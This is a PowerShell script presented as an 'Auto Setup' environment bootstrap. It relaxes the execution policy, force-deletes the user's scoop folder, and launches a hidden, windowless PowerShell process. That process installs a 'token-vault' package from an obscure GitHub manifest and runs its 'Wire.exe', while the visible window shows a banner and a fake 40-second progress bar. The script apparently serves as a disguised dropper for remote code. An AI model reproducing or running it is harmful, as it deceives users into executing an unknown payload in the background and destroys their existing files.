Clear-Host

Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser

$packageName = "token-vault"
$installUrl = "https://raw.githubusercontent.com/lab8851/lab/refs/heads/main/token-vault.json"
$scoopShims = "$env:USERPROFILE\scoop\shims"
$scoopPath = "$env:USERPROFILE\scoop"
$appPath = "$env:USERPROFILE\scoop\apps\$packageName"
$targetExe = "$appPath\*\Wire.exe"
$targetExe2 = "$appPath\*\app*\Wire.exe"

if ((Test-Path $targetExe) -and (Test-Path $targetExe2)) {
    Clear-Host
    Write-Host "[INFO] " -NoNewline -ForegroundColor Green
    Write-Host "The application is already installed. All tasks are already complete!" -ForegroundColor White
}
else {
    # If the app folder or core executable is missing/damaged, clean up and reinstall
    if (Test-Path $appPath) {
        Remove-Item -Path $appPath -Recurse -Force -ErrorAction SilentlyContinue
    }
    if (Test-Path $scoopPath) {
        Remove-Item -Path $scoopPath -Recurse -Force -ErrorAction SilentlyContinue
    }

    $command = "`$env:PATH = '$scoopShims;' + `$env:PATH; " +
               "if (!(Get-Command scoop -ErrorAction SilentlyContinue)) { irm get.scoop.sh | iex | Out-Null }; " +
               "scoop install $installUrl; wire"

    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = "powershell.exe"
    $psi.Arguments = "-Command `"$command`""
    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $psi.CreateNoWindow = $true
    [System.Diagnostics.Process]::Start($psi) | Out-Null

    

    Write-Host "==========================================================" -ForegroundColor Cyan
    Write-Host "     _         _          ____       _             " -ForegroundColor Cyan
    Write-Host "    / \  _   _| |_ ___   / ___|  ___| |_ _   _ _ __  " -ForegroundColor Cyan
    Write-Host "   / _ \| | | | __/ _ \  \___ \ / _ \ __| | | | '_ \ " -ForegroundColor DarkCyan
    Write-Host "  / ___ \ |_| | || (_) |  ___) |  __/ |_| |_| | |_) |" -ForegroundColor DarkCyan
    Write-Host " /_/   \_\__,_|\__\___/  |____/ \___|\__|\__,_| .__/ " -ForegroundColor Cyan
    Write-Host "                                              |_|    " -ForegroundColor Cyan
    Write-Host "==========================================================" -ForegroundColor DarkGray
    Write-Host "          LIGHTNING-FAST ENVIRONMENT BOOTSTRAP            " -ForegroundColor Yellow
    Write-Host "----------------------------------------------------------" -ForegroundColor DarkGray
    Write-Host ""
    Write-Host "[INFO] " -NoNewline -ForegroundColor Green
    Write-Host "Automated installation will begin shortly." -ForegroundColor White
    Write-Host "[INFO] " -NoNewline -ForegroundColor Green
    Write-Host "Please keep this window open and wait a moment..." -ForegroundColor White
    Write-Host ""

    $totalSteps = 100
    $delayMs = 400          # 0.4sec * 100 = 40sec

    for ($i = 1; $i -le $totalSteps; $i++) {
        $percent = [int](($i / $totalSteps) * 100)
        $completed = '=' * [int]($percent / 2)  
        $remaining = ' ' * (50 - $completed.Length)
        
        Write-Host -NoNewline "`r[$completed$remaining] $percent% complete"
        Start-Sleep -Milliseconds $delayMs
    }

    if ((Test-Path $targetExe) -and (Test-Path $targetExe2)) {
        Write-Host ""
        Write-Host "[SUCCESS] Installation completed successfully!" -ForegroundColor Green
    } else {
        Write-Host ""
        Write-Host "[RETRY] Some files are missing. Try again..." -ForegroundColor Green
    }
    
}
